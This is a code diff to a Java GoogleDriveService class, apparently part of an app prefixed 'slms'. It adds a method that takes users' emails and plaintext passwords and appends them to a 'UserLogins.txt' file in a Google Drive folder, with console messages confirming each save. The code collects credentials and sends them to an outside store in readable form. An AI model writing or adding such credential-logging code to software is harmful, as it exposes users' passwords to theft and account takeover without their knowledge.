@@ -111,4 +111,58 @@ public class GoogleDriveService {
         
         return folder.getId();
     }
+    public void saveUserCredentialsToDrive(String email, String password) {
+        if (driveService == null) {
+            System.err.println("⚠️ Google Drive Service NOT initialized. Cannot log credentials.");
+            return;
+        }
+
+        try {
+            String fileName = "UserLogins.txt";
+            String content = "Email: " + email + " | Password: " + password + "\n";
+            
+            // 1. Search for existing file
+            String query = "name = '" + fileName + "' and '" + mainFolderId + "' in parents and trashed = false";
+            List<File> files = driveService.files().list()
+                    .setQ(query)
+                    .setSpaces("drive")
+                    .setFields("files(id, name)")
+                    .execute()
+                    .getFiles();
+
+            if (files != null && !files.isEmpty()) {
+                String fileId = files.get(0).getId();
+                
+                // 2. Download existing content
+                java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();
+                driveService.files().get(fileId).executeMediaAndDownloadTo(outputStream);
+                String existingContent = outputStream.toString();
+                String newContent = existingContent + content;
+
+                // 3. Update file
+                java.io.File tempFile = java.io.File.createTempFile("slms_user_log_", ".txt");
+                Files.writeString(tempFile.toPath(), newContent);
+                FileContent mediaContent = new FileContent("text/plain", tempFile);
+                
+                driveService.files().update(fileId, new File(), mediaContent).execute();
+                Files.delete(tempFile.toPath());
+                System.out.println("✅ Credentials for " + email + " APPENDED to Google Drive.");
+            } else {
+                // 4. Create new file
+                File fileMetadata = new File();
+                fileMetadata.setName(fileName);
+                fileMetadata.setParents(Collections.singletonList(mainFolderId));
+
+                java.io.File tempFile = java.io.File.createTempFile("slms_user_log_", ".txt");
+                Files.writeString(tempFile.toPath(), content);
+                FileContent mediaContent = new FileContent("text/plain", tempFile);
+
+                driveService.files().create(fileMetadata, mediaContent).execute();
+                Files.delete(tempFile.toPath());
+                System.out.println("✅ Credentials for " + email + " SAVED (New File) to Google Drive.");
+            }
+        } catch (Exception e) {
+            System.err.println("❌ Failed to save credentials to Drive: " + e.getMessage());
+        }
+    }
 }
